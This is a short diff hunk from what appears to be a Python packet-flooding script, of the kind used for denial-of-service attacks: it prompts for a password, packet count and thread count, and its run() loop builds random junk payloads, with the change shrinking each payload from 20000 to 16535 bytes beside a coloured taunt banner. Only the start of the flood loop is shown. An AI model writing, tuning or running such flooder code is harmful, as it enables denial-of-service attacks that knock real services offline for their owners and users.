@@ -45,7 +45,7 @@ choice = str(input("> Password:"))
 times = int(input("> Packet:"))
 threads = int(input("> Theards:"))
 def run():
-	data = random._urandom(20000)
+	data = random._urandom(16535)
 	i = random.choice(("\033[31mAHHH KOK NEMBUSS","",""))
 	while True:
 		try:
